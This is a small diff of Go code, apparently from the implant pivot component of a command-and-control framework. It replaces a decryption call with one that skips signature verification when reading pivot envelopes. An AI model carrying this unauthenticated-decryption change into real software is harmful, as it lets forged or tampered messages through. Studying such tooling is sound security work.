@@ -544,7 +544,7 @@ func (p *NetConnPivot) readEnvelope() (*pb.Envelope, error) {
 		// {{end}}
 		return nil, err
 	}
-	data, err = p.cipherCtx.Decrypt(data)
+	data, err = p.cipherCtx.DecryptWithoutSignatureCheck(data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[pivot] Decryption error: %s", err)
